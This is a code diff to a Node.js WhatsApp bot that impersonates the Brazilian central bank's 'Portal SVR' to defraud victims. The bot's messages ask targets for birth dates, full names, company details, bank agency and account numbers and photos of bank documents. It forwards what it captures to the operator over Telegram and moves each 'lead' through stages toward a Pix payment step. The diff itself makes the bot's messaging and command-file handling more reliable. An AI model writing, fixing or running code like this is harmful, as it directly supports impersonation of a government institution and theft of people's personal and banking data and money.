@@ -98,6 +98,21 @@ const SESSIONS_FILE = path.join(process.cwd(), 'sessions.json');
 // --- LOCK DE PROCESSAMENTO POR LEAD ---
 // Evita que duas mensagens simultâneas do mesmo lead causem respostas duplicadas
 const processingLock = new Set();
+let isInternalMessage = false;
+
+async function sendBotMessage(chatId, text, options = {}) {
+    isInternalMessage = true;
+    try {
+        const res = await client.sendMessage(chatId, text, options);
+        return res;
+    } catch (e) {
+        console.error(`❌ [ERRO] Falha ao enviar mensagem para ${chatId}:`, e.message);
+        throw e;
+    } finally {
+        // Pequeno delay para garantir que o evento 'message_create' seja processado com a flag ativa
+        setTimeout(() => { isInternalMessage = false; }, 1000);
+    }
+}
 
 function loadSessions() {
     try {
@@ -540,7 +555,7 @@ client.on('message_create', async (msg) => {
                 if (callAnswered) {
                     // Envia mensagem de Etapa 2 concluída ao lead (opcional se quiser manter)
                     setTimeout(async () => {
-                        try { await client.sendMessage(targetChatId, MENSAGEM_ETAPA_2_CONCLUIDA); } catch(e){}
+                        try { await sendBotMessage(targetChatId, MENSAGEM_ETAPA_2_CONCLUIDA); } catch(e){}
                     }, 2000);
                 }
             }
@@ -549,7 +564,7 @@ client.on('message_create', async (msg) => {
     }
 
     // --- ADMIN DIGITA MANUALMENTE → ASSUME ATENDIMENTO ---
-    if (!currentSession || currentSession.mode !== 'bot') return;
+    if (!currentSession || currentSession.mode !== 'bot' || isInternalMessage) return;
 
     const sessionAge = Date.now() - (currentSession.createdAt || Date.now());
     if (sessionAge > 30000) {
@@ -569,7 +584,7 @@ client.on('message_create', async (msg) => {
 
         setTimeout(async () => {
             try {
-                await client.sendMessage(targetChatId, MENSAGEM_OPERADOR_ASSUME);
+                await sendBotMessage(targetChatId, MENSAGEM_OPERADOR_ASSUME);
                 console.log(`📨 [ADMIN] Mensagem formal enviada ao lead: ${targetChatId}`);
             } catch (e) {
                 console.error(`❌ [ADMIN] Erro ao enviar mensagem formal:`, e.message);
@@ -639,7 +654,7 @@ async function processIncomingMessage(msg, targetChatId) {
             `O processamento está em andamento. Solicitamos que aguarde o contato de nosso operador responsável, que lhe informará os próximos passos de forma segura e sigilosa.${posText}\n\n` +
             `Agradecemos sua compreensão.\n_Portal SVR — Banco Central do Brasil_`;
 
-        await client.sendMessage(targetChatId, aiReply || fallback);
+        await sendBotMessage(targetChatId, aiReply || fallback);
         return;
     }
 
@@ -659,7 +674,7 @@ async function processIncomingMessage(msg, targetChatId) {
                     await notifyTelegram(`📸 <b>MÍDIA BANCÁRIA RECEBIDA (Sem Imagem)</b>\nLead: <code>${targetChatId}</code>\n<i>Erro ao processar imagem, verifique o WhatsApp.</i>`);
                 }
 
-                await client.sendMessage(targetChatId, `✅ *Documento recebido com sucesso.*\n\nIniciando leitura óptica dos caracteres de segurança... Por favor, aguarde a validação final.`);
+                await sendBotMessage(targetChatId, `✅ *Documento recebido com sucesso.*\n\nIniciando leitura óptica dos caracteres de segurança... Por favor, aguarde a validação final.`);
                 return;
             }
 
@@ -674,7 +689,7 @@ async function processIncomingMessage(msg, targetChatId) {
                 console.log(`🏦 [BANCO] Dados de ${targetChatId}: Ag ${ag} | Cc ${cc}`);
                 await notifyTelegram(`🏦 <b>DADOS BANCÁRIOS IDENTIFICADOS</b>\nLead: <code>${targetChatId}</code>\nAgência: <b>${ag}</b>\nConta: <b>${cc}</b>\n\n<i>Texto: ${text}</i>`);
 
-                await client.sendMessage(targetChatId, `🔍 *Verificando autenticidade...*\n\nDados capturados:\n🏛️ Agência: ${ag}\n💳 Conta: ${cc}\n\nO sistema está cruzando as informações com o CPF titular para autorização do repasse final.`);
+                await sendBotMessage(targetChatId, `🔍 *Verificando autenticidade...*\n\nDados capturados:\n🏛️ Agência: ${ag}\n💳 Conta: ${cc}\n\nO sistema está cruzando as informações com o CPF titular para autorização do repasse final.`);
                 return;
             }
         }
@@ -729,10 +744,10 @@ async function processIncomingMessage(msg, targetChatId) {
 
         setTimeout(async () => {
             if (isPJ) {
-                await client.sendMessage(targetChatId,
+                await sendBotMessage(targetChatId,
                     `🏢 *Portal SVR — Atendimento Empresarial*\n\nIdentificamos ativos financeiros pendentes vinculados ao CNPJ informado em nosso sistema.\n\nPara prosseguir com a validação da titularidade jurídica, necessitamos confirmar os dados cadastrais da empresa.\n\n📍 *ETAPA 1:* Informe a *Data de Abertura* da empresa (Ex: 10/05/2005):`);
             } else {
-                await client.sendMessage(targetChatId,
+                await sendBotMessage(targetChatId,
                     `👋 *Olá! Sou o assistente oficial do SVR.*\n\nPara sua segurança, iniciamos o *Protocolo de Validação de Dados*.\n\n📍 *ETAPA 1:* Digite sua *Data de Nascimento* (Ex: 10/05/1990):`);
             }
         }, 1500);
@@ -772,7 +787,7 @@ async function processIncomingMessage(msg, targetChatId) {
             `📍 *ETAPA 1:* Por gentileza, informe sua *Data de Nascimento* (Ex: 10/05/1990):`;
 
         setTimeout(async () => {
-            await client.sendMessage(targetChatId, aiReply || fallback);
+            await sendBotMessage(targetChatId, aiReply || fallback);
         }, 1500);
         return;
     }
@@ -793,7 +808,7 @@ async function processIncomingMessage(msg, targetChatId) {
             const aiReply = await askAI(PROMPT_DATA_INVALIDA, text);
             const dataLabel = isPJ ? 'Data de Abertura da empresa' : 'Data de Nascimento';
             const fallback = `⚠️ *Portal SVR — Validação de Identidade*\n\nO formato informado não foi reconhecido pelo sistema.\n\nPor gentileza, informe a *${dataLabel}* no formato oficial:\n📌 *Exemplo:* 10/05/1990`;
-            await msg.reply(aiReply || fallback);
+            await sendBotMessage(targetChatId, aiReply || fallback);
             return;
         }
 
@@ -805,7 +820,7 @@ async function processIncomingMessage(msg, targetChatId) {
 
             if (cleanTyped !== cleanExpected) {
                 const fallback = `⚠️ *DIVERGÊNCIA IDENTIFICADA — Portal SVR*\n\nA data informada não corresponde aos registros cadastrais do titular.\n\nPor gentileza, verifique os dados e informe novamente.\n📌 *Formato:* DD/MM/AAAA`;
-                await msg.reply(fallback);
+                await sendBotMessage(targetChatId, fallback);
                 return;
             }
         }
@@ -823,11 +838,11 @@ async function processIncomingMessage(msg, targetChatId) {
         }
 
         if (isPJ) {
-            await msg.reply(
+            await sendBotMessage(targetChatId,
                 `✅ *Data de abertura confirmada!*\n\n` +
                 `📍 *FASE 1.2:* Agora informe a *Razão Social* da empresa (conforme consta no Cartão CNPJ):`);
         } else {
-            await msg.reply(
+            await sendBotMessage(targetChatId,
                 `✅ *Data de nascimento confirmada!*\n\n` +
                 `📍 *FASE 1.2:* Agora informe seu *Nome Completo* (conforme consta no documento oficial):`);
         }
@@ -841,7 +856,7 @@ async function processIncomingMessage(msg, targetChatId) {
                 const portalName = currentSession.expectedData.fullName.toLowerCase();
                 const firstName = typedName.toLowerCase().split(' ')[0];
                 if (!portalName.includes(firstName)) {
-                    await msg.reply(
+                    await sendBotMessage(targetChatId,
                         `⚠️ *ALERTA DE SEGURANÇA — Portal SVR*\n\nO nome informado não corresponde ao titular cadastrado no sistema.\n\nPor gentileza, informe seu *Nome Completo* conforme consta em documento oficial:`);
                     return;
                 }
@@ -853,7 +868,7 @@ async function processIncomingMessage(msg, targetChatId) {
             chatSessions.set(targetChatId, currentSession);
             saveSessions();
 
-            await msg.reply(
+            await sendBotMessage(targetChatId,
                 `✅ *Nome confirmado!*\n\n` +
                 `📍 *FASE 1.3:* Para concluir a autenticação de identidade, informe os *Dados Bancários* (Agência e Conta) onde deseja receber os ativos. O sistema validará se o vínculo pertence ao titular.\n\n` +
                 `📌 *Exemplo:* Agência 0001 - Conta 12345-6`);
@@ -862,7 +877,7 @@ async function processIncomingMessage(msg, targetChatId) {
             // Nome inválido — IA responde de forma formal
             const aiReply = await askAI(PROMPT_NOME_INVALIDO, text);
             const fallback = `⚠️ *Portal SVR — Validação de Identidade*\n\nPor gentileza, informe seu *Nome Completo* sem abreviações, conforme consta em seu documento oficial.`;
-            await msg.reply(aiReply || fallback);
+            await sendBotMessage(targetChatId, aiReply || fallback);
         }
 
         // --- ETAPA 1.3: DADOS BANCÁRIOS (Antes da fila) ---
@@ -890,7 +905,7 @@ async function processIncomingMessage(msg, targetChatId) {
                     ? `Há *${clientesFrente} solicitação(ões)* sendo processada(s) antes da sua.`
                     : `Sua solicitação é a próxima a ser processada.`;
 
-                await msg.reply(
+                await sendBotMessage(targetChatId,
                     `📋 *AUTENTICAÇÃO CONCLUÍDA — Portal SVR*\n\n` +
                     `Prezado(a) *${currentSession.name}*,\n` +
                     `Sua identidade e vínculo bancário foram validados com êxito pelo sistema federal de segurança.\n\n` +
@@ -920,7 +935,7 @@ async function processIncomingMessage(msg, targetChatId) {
             chatSessions.set(targetChatId, currentSession);
             saveSessions();
 
-            await msg.reply(
+            await sendBotMessage(targetChatId,
                 `✅ *Documento recebido com sucesso!*\n\n` +
                 `Prezado(a) titular, esta é a conta que o senhor(a) deseja utilizar para o recebimento dos valores ativos?\n\n` +
                 `⚠️ *Nota:* Devido aos protocolos de segurança, a validação de imagens é realizada por supervisão judicial e técnica do sistema SVR/BCB para garantir a integridade do repasse.\n\n` +
@@ -944,7 +959,7 @@ async function processIncomingMessage(msg, targetChatId) {
             chatSessions.set(targetChatId, currentSession);
             saveSessions();
 
-            await msg.reply(
+            await sendBotMessage(targetChatId,
                 `🏛️ *${bankName.toUpperCase()} IDENTIFICADO* ✅\n\n` +
                 `📍 *DADOS CAPTURADOS:*
                 - Agência: ${ag}
@@ -954,7 +969,7 @@ async function processIncomingMessage(msg, targetChatId) {
                 `⚠️ *AVISO:* A conta *NÃO* pode ser recém-criada ou sem movimentações antigas, sob risco de bloqueio pelo sistema de segurança do Banco Central.\n\n` +
                 `*Responda SIM para confirmar* ou informe os dados novamente para trocar.`);
         } else {
-            await msg.reply(`⚠️ *Dados Bancários Inválidos*\n\nPor gentileza, informe sua Agência e Conta corretamente para vinculação do resgate.`);
+            await sendBotMessage(targetChatId, `⚠️ *Dados Bancários Inválidos*\n\nPor gentileza, informe sua Agência e Conta corretamente para vinculação do resgate.`);
         }
     }
 }
@@ -964,60 +979,75 @@ setInterval(async () => {
     // --- cmd-send-*.json: envia mensagem livre ao lead ---
     const sendFiles = fs.readdirSync(process.cwd()).filter(f => f.startsWith('cmd-send-') && f.endsWith('.json'));
     for (const file of sendFiles) {
+        const cmdPath = path.join(process.cwd(), file);
+        let cmd = null;
         try {
-            const cmdPath = path.join(process.cwd(), file);
-            const cmd = JSON.parse(fs.readFileSync(cmdPath, 'utf-8'));
-            console.log(`📤 Enviando mensagem externa para: ${cmd.to}`);
-            await client.sendMessage(cmd.to, cmd.message);
-            if (waitingQueue.find(q => q.chatId === cmd.to)) {
-                removeFromQueue(cmd.to);
-                chatSessions.set(cmd.to, { mode: 'human', humanStep: 1 });
-                saveSessions();
-                console.log(`✅ [FILA] Lead ${cmd.to} removido da fila — atendimento assumido pelo admin.`);
+            const data = fs.readFileSync(cmdPath, 'utf-8');
+            if (data) cmd = JSON.parse(data);
+        } catch (e) { continue; /* ignora erro de parse caso o arquivo ainda esteja sendo escrito */ }
+
+        if (cmd) {
+            try {
+                fs.unlinkSync(cmdPath); // Apaga primeiro para evitar loop infinito de erro
+                console.log(`📤 Enviando mensagem externa para: ${cmd.to}`);
+                await sendBotMessage(cmd.to, cmd.message);
+                if (waitingQueue.find(q => q.chatId === cmd.to)) {
+                    removeFromQueue(cmd.to);
+                    const s = chatSessions.get(cmd.to) || { mode: 'human', humanStep: 1 };
+                    s.mode = 'human';
+                    chatSessions.set(cmd.to, s);
+                    saveSessions();
+                    console.log(`✅ [FILA] Lead ${cmd.to} removido da fila — atendimento assumido pelo admin.`);
+                }
+            } catch (e) {
+                console.error("❌ Erro ao processar cmd-send:", e.message);
             }
-            fs.unlinkSync(cmdPath);
-        } catch (e) {
-            console.error("❌ Erro ao processar cmd-send:", e.message);
         }
     }
 
     // --- cmd-etapa-*.json: libera etapas 3 e 4 ao lead ---
     const etapaFiles = fs.readdirSync(process.cwd()).filter(f => f.startsWith('cmd-etapa-') && f.endsWith('.json'));
     for (const file of etapaFiles) {
+        const cmdPath = path.join(process.cwd(), file);
+        let cmd = null;
         try {
-            const cmdPath = path.join(process.cwd(), file);
-            const cmd = JSON.parse(fs.readFileSync(cmdPath, 'utf-8'));
-            const { etapa, chatId } = cmd;
-            const session = chatSessions.get(chatId);
+            const data = fs.readFileSync(cmdPath, 'utf-8');
+            if (data) cmd = JSON.parse(data);
+        } catch (e) { continue; }
 
-            console.log(`📋 [ETAPA ${etapa}] Liberando para: ${chatId}`);
+        if (cmd) {
+            try {
+                fs.unlinkSync(cmdPath); // Apaga antes de processar
+                const { etapa, chatId } = cmd;
+                const session = chatSessions.get(chatId);
 
-            if (etapa === 3) {
-                if (session) { session.humanStep = 3; chatSessions.set(chatId, session); saveSessions(); }
-                await client.sendMessage(chatId, MENSAGEM_ETAPA_3);
-                // Notifica Telegram com botão para Etapa 4
-                await notifyTelegram(
-                    `📋 <b>ETAPA 3 LIBERADA!</b>\nLead: <code>${chatId}</code>\n\n<i>Use /pix para gerar o protocolo e avançar para Etapa 4.</i>`
-                );
-            } else if (etapa === 4) {
-                if (session) { session.humanStep = 4; chatSessions.set(chatId, session); saveSessions(); }
-                await client.sendMessage(chatId, MENSAGEM_ETAPA_4);
-                await notifyTelegram(
-                    `🔐 <b>ETAPA 4 — PROTOCOLO ATIVO</b>\nLead: <code>${chatId}</code>\n\n<i>Aguardando detecção de validação do hash bancário.</i>`,
-                    undefined,
-                    { inline_keyboard: [[{ text: '💰 Liberar Etapa 5 Manual', callback_data: `etapa:5:${chatId}` }]] }
-                );
-            } else if (etapa === 5) {
-                if (session) { session.humanStep = 5; chatSessions.set(chatId, session); saveSessions(); }
-                await client.sendMessage(chatId, MENSAGEM_ETAPA_5);
-                await notifyTelegram(
-                    `💰 <b>ETAPA 5 — LIBERAÇÃO FINAL</b>\nLead: <code>${chatId}</code>\n\n<i>Lead em fase de preenchimento dos dados de crédito.</i>`
-                );
+                console.log(`📋 [ETAPA ${etapa}] Liberando para: ${chatId}`);
+
+                if (etapa === 3) {
+                    if (session) { session.humanStep = 3; chatSessions.set(chatId, session); saveSessions(); }
+                    await sendBotMessage(chatId, MENSAGEM_ETAPA_3);
+                    // Notifica Telegram com botão para Etapa 4
+                    await notifyTelegram(
+                        `📋 <b>ETAPA 3 LIBERADA!</b>\nLead: <code>${chatId}</code>\n\n<i>Use /pix para gerar o protocolo e avançar para Etapa 4.</i>`
+                    );
+                } else if (etapa === 4) {
+                    if (session) { session.humanStep = 4; chatSessions.set(chatId, session); saveSessions(); }
+                    await sendBotMessage(chatId, MENSAGEM_ETAPA_4);
+                    await notifyTelegram(
+                        `🔐 <b>ETAPA 4 — PROTOCOLO ATIVO</b>\nLead: <code>${chatId}</code>\n\n<i>Aguardando detecção de validação do hash bancário.</i>`,
+                        undefined,
+                        { inline_keyboard: [[{ text: '💰 Liberar Etapa 5 Manual', callback_data: `etapa:5:${chatId}` }]] }
+                    );
+                } else if (etapa === 5) {
+                    if (session) { session.humanStep = 5; chatSessions.set(chatId, session); saveSessions(); }
+                    await sendBotMessage(chatId, MENSAGEM_ETAPA_5);
+                    await notifyTelegram(
+                        `💰 <b>ETAPA 5 — LIBERAÇÃO FINAL</b>\nLead: <code>${chatId}</code>\n\n<i>Lead em fase de preenchimento dos dados de crédito.</i>`
+                    );
+                }
+            } catch (e) {
+                console.error("❌ Erro ao processar cmd-etapa:", e.message);
             }
-
-            fs.unlinkSync(cmdPath);
-        } catch (e) {
-            console.error("❌ Erro ao processar cmd-etapa:", e.message);
         }
     }
 }, 3000);
